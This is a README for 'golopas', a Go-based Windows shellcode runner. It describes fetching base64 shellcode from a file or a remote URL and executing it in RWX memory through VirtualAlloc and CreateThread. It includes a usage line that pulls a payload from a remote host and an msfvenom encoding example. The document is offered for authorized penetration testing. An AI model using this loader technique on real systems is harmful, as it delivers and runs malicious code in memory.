# golopas

A minimal Windows shellcode runner that fetches, decodes, and executes shellcode in memory.

> ⚠️ **Disclaimer** — For authorized penetration testing and security research only. You are responsible for complying with the laws where you use this. Use at your own risk.

## How it works

Takes base64-encoded shellcode from a local file or remote URL, decodes it, allocates RWX memory with `VirtualAlloc`, copies the shellcode in with `RtlMoveMemory`, and runs it via `CreateThread`.

## Usage

```powershell
golopas.exe -local C:\path\to\shellcode.enc
golopas.exe -remote http://host/shellcode.enc
```

`-local` — path to a base64 shellcode file. `-remote` — URL to fetch it from. One is required.

Encode your shellcode first, e.g.:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64 > shellcode.enc
```

## Build

Cross-compile from any machine with Go 1.27+:

```bash
GOOS=windows GOARCH=amd64 go build -o golopas.exe
```

## Release

To cut a release (tags the repo, builds `golopas-<version>.exe`, and publishes it with `gh` if installed):

```bash
./release.sh 1.0.0
```

## Credits

Technique based on [this walkthrough](https://www.youtube.com/watch?v=MRNwrvfq_G0&t=32s).

## Author

**Phyo Zin Khant** — hello@phyozinkhant.dev

## License

MIT — see [LICENSE](LICENSE).
